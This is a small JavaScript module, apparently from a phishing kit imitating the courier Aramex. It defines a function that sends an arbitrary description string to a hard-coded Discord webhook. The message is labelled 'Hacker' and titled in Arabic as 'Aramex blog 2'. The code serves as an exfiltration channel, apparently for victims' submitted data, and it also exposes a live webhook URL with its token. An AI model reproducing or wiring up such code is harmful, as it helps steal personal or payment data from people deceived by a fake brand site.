import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1328691032820551743/yWfFP1g2diJzxUKxEchSI5QmPnj-j29F-hspI9R-Xh0HNHSHH_beS-XSo4xo6MCPfIra",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
